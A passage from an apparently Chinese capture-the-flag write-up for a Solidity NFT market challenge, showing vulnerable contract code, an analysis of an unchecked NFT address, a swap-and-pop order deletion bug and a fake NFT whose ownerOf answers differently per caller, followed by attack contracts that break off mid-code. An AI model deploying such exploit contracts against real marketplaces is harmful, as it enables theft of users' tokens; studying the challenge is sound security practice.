spender<span class="token punctuation">)</span> <span class="token operator">||</span> nft<span class="token punctuation">.</span><span class="token function">getApproved</span><span class="token punctuation">(</span>tokenId<span class="token punctuation">)</span> <span class="token operator">==</span> spender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_deleteOrder</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> orderId<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">{</span>        orders<span class="token punctuation">[</span>orderId<span class="token punctuation">]</span> <span class="token operator">=</span> orders<span class="token punctuation">[</span>orders<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        orders<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">onERC721Received</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">uint256</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>onERC721Received<span class="token punctuation">.</span>selector<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">CouponVerifierBeta</span> <span class="token punctuation">{</span>    CtfMarket market<span class="token punctuation">;</span>    <span class="token builtin">bool</span> tested<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        market <span class="token operator">=</span> <span class="token function">CtfMarket</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">verifyCoupon</span><span class="token punctuation">(</span>SignedCoupon <span class="token keyword">calldata</span> scoupon<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>tested<span class="token punctuation">,</span> <span class="token string">"Tested"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tested <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        Coupon <span class="token keyword">memory</span> coupon <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">;</span>        Signature <span class="token keyword">memory</span> sig <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>signature<span class="token punctuation">;</span>        Order <span class="token keyword">memory</span> order <span class="token operator">=</span> market<span class="token punctuation">.</span><span class="token function">getOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> serialized <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>            <span class="token string">"I, the issuer"</span><span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>issuer<span class="token punctuation">,</span>            <span class="token string">"offer a special discount for"</span><span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span>            <span class="token string">"to buy"</span><span class="token punctuation">,</span> order<span class="token punctuation">,</span> <span class="token string">"at"</span><span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>newprice<span class="token punctuation">,</span>            <span class="token string">"because"</span><span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>reason        <span class="token punctuation">)</span><span class="token punctuation">;</span>        IERC721 nft <span class="token operator">=</span> <span class="token function">IERC721</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span> owner <span class="token operator">=</span> nft<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>issuer <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">"Invalid issuer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">ecrecover</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">,</span> sig<span class="token punctuation">.</span>v<span class="token punctuation">,</span> sig<span class="token punctuation">.</span>rs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sig<span class="token punctuation">.</span>rs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> coupon<span class="token punctuation">.</span>issuer<span class="token punctuation">,</span> <span class="token string">"Invalid signature"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>拿到flag的要求是将三个NFT都转移到自己的账户下，然后调用win函数。三个NFT分别价格为1，1337，13333333337。market合约拥有1337个token，而我们只能通过Airdrop获取5个token。所以我们需要采用一些手段。</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先1号NFT价格为1，我们可以直接买。但是要注意买的顺序，这里在后面会提到。</p><p>再看2号NFT。注意到，market合约中有一个<code>purchaseTest</code>函数，只能调用一次，作用是让market合约去创建一个订单并且购买一个NFT。这里我们注意到，合约<strong>没有对NFT的地址进行校验</strong>。所以我们可以部署一个<strong>假的NFT合约</strong>，mint一个NFT给攻击合约并标价1337，让market去购买即可。这样我们的攻击合约就得到了1342个token，可以购买1、2NFT。</p><p>最后看3号NFT。这里题目合约实现了一个优惠券购买的功能，由<strong>NFT的拥有者用私钥签名</strong>，可以以任意价格购买NFT。但是这里的问题是显然3号NFT拥有者是market合约，不可能得到签名来的优惠券。</p><p>仔细观察<code>purchaseWithCoupon</code>函数。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">purchaseWithCoupon</span><span class="token punctuation">(</span>SignedCoupon <span class="token keyword">calldata</span> scoupon<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>    Coupon <span class="token keyword">memory</span> coupon <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>user <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token string">"Invalid user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>newprice <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Invalid price"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    verifier<span class="token punctuation">.</span><span class="token function">verifyCoupon</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">)</span><span class="token punctuation">;</span>    Order <span class="token keyword">memory</span> order <span class="token operator">=</span> <span class="token function">getOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint</span> price <span class="token operator">=</span> order<span class="token punctuation">.</span>price<span class="token punctuation">;</span>    <span class="token function">_deleteOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>    IERC721 nft <span class="token operator">=</span> <span class="token function">IERC721</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> owner <span class="token operator">=</span> nft<span class="token punctuation">.</span><span class="token function">ownerOf</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    ctfToken<span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">IERC721</span><span class="token punctuation">(</span><span class="token function">getOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">.</span>nftAddress<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">safeTransferFrom</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_deleteOrder</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">emit</span> <span class="token function">NFTBought</span><span class="token punctuation">(</span>coupon<span class="token punctuation">.</span>user<span class="token punctuation">,</span> order<span class="token punctuation">.</span>nftAddress<span class="token punctuation">,</span> order<span class="token punctuation">.</span>tokenId<span class="token punctuation">,</span> coupon<span class="token punctuation">.</span>newprice<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现了三个问题点：</p><ul><li>函数中进行了<strong>两次_deletOrder</strong>，可能会导致订单秩序混乱</li><li>owner由NFT合约提供，同样这里并没有对NFT的地址进行校验。</li><li>转账NFT的时候再次调用了<code>getOrder</code>函数，可能会发生错误转账。</li></ul><p>再看_deleteOrder函数。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">_deleteOrder</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> orderId<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">{</span>    orders<span class="token punctuation">[</span>orderId<span class="token punctuation">]</span> <span class="token operator">=</span> orders<span class="token punctuation">[</span>orders<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    orders<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>每次将队尾元素放在要删除的位置，然后pop掉队尾元素。优点是不需要整体移动队列，节省了gas，缺点是会<strong>导致队列顺序混乱</strong>。</p><p>根据<code>purchaseWithCoupon</code>函数中的逻辑，如果我们在购买3号NFT的订单后添加一个订单，tokenId也为3，并且购买0号订单，那么在<code>_deleteOrder</code>函数生效后，0号订单会被1号订单覆盖，而1号订单被错误地执行并且将NFT转移到我们的账户下，过程大致如下。</p><pre class="line-numbers language-none"><code class="language-none">| 1 | 2 | 3 | ----&gt; | 1 | 2 | 3 | fake3 | ----&gt; | fake3 | 2 | 3 | ----&gt; | fake3 | 3 | ----&gt; 3 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然而，这里我们遇到了一个问题，在<code>verifyCoupon</code>的过程中调用了NFT的<code>ownerOf</code>，并且要求拥有者是优惠券的签发者。但同样在<code>safeTransferFrom</code>过程中要求owner是market市场，才可以完成对3号NFT的转移。</p><p>所以问题在我们的NFT合约中，<strong>如何在不改变状态变量的情况下，让同样的调用返回不同的结果？</strong></p><p>这里刚开始我的想法是利用<code>gasleft</code>来判断，我在本地进行了多次调试也成功了，但是远程始终打不通，所以在比赛中本题没有解出来。</p><p>后来在比赛结束后，我发现因为两次调用<code>ownerOf</code>的合约不同，故可以使用msg.sender来判断并且进行“看人下菜”。</p><p>可惜在比赛中短路了一时没想出来。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_ownerOf</span><span class="token punctuation">(</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> owner<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span>market<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../src/vul.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"forge-std/Test.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">ENFT2</span> <span class="token punctuation">{</span>    CtfMarket market<span class="token punctuation">;</span>    <span class="token builtin">address</span> playerAddress<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=&gt;</span> <span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _owners<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _balances<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=&gt;</span> <span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _tokenApprovals<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _operatorApprovals<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> marketAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">_setApprovalForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        market <span class="token operator">=</span> <span class="token function">CtfMarket</span><span class="token punctuation">(</span>marketAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>        playerAddress <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        unchecked <span class="token punctuation">{</span>            _balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        _owners<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span> <span class="token operator">=</span> to<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_transfer</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        <span class="token keyword">delete</span> _tokenApprovals<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span><span class="token punctuation">;</span>        unchecked <span class="token punctuation">{</span>            _balances<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>            _balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        _owners<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span> <span class="token operator">=</span> to<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        _tokenApprovals<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span> <span class="token operator">=</span> to<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_setApprovalForAll</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> owner<span class="token punctuation">,</span>        <span class="token builtin">address</span> operator<span class="token punctuation">,</span>        <span class="token builtin">bool</span> approved    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> operator<span class="token punctuation">,</span> <span class="token string">"ERC721: approve to caller"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _operatorApprovals<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">[</span>operator<span class="token punctuation">]</span> <span class="token operator">=</span> approved<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token function">_transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">safeTransferFrom</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token function">_safeTransfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_safeTransfer</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        <span class="token function">_transfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual <span class="token punctuation">{</span>        <span class="token function">_approve</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_ownerOf</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> virtual <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> _owners<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_ownerOf</span><span class="token punctuation">(</span>tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC721: invalid token ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> owner<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getApproved</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span>        <span class="token keyword">public</span>        <span class="token keyword">view</span>        virtual        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> _tokenApprovals<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isApprovedForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> operator<span class="token punctuation">)</span>        <span class="token keyword">public</span>        <span class="token keyword">view</span>        virtual        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">ENFT3</span> <span class="token punctuation">{</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=&gt;</span> <span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _owners<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _balances<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=&gt;</span> <span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _tokenApprovals<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _operatorApprovals<span class="token punctuation">;</span>    CtfMarket market<span class="token punctuation">;</span>    CtfToken token<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _addr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        market <span class="token operator">=</span> <span class="token function">CtfMarket</span><span class="token punctuation">(</span>_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        token <span class="token operator">=</span> market<span class="token punctuation">.</span><span class="token function">ctfToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">_setApprovalForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _addr<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        unchecked <span class="token punctuation">{</span>            _balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        _owners<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span> <span class="token operator">=</span> to<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_transfer</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        <span class="token keyword">delete</span> _tokenApprovals<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span><span class="token punctuation">;</span>        unchecked <span class="token punctuation">{</span>            _balances<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>            _balances<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        _owners<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span> <span class="token operator">=</span> to<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span> <span class="token keyword">internal</span> virtual <span class="token punctuation">{</span>        _tokenApprovals<span class="token punctuation">[</span>tokenId<span class="token punctuation">]</span> <span class="token operator">=</span> to<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_setApprovalForAll</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> 